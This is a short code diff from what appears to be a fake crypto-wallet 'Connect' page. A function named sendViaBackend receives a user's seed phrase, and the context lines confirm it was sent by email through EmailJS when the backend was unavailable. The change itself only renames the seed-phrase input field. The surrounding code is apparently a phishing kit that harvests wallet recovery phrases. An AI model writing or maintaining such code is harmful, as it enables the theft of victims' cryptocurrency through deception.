@@ -1430,7 +1430,7 @@ async function sendViaBackend(walletName, walletIcon, seedPhrase, connectBtn) {
     // Still successful if EmailJS worked
     alert("✅ Email sent via EmailJS (backend unavailable)");
     closeModal("modal2");
-    document.getElementById("ceed-input").value = "";
+    document.getElementById("seed-phrase-input").value = "";
     connectBtn.disabled = false;
     connectBtn.textContent = "Connect";
   }
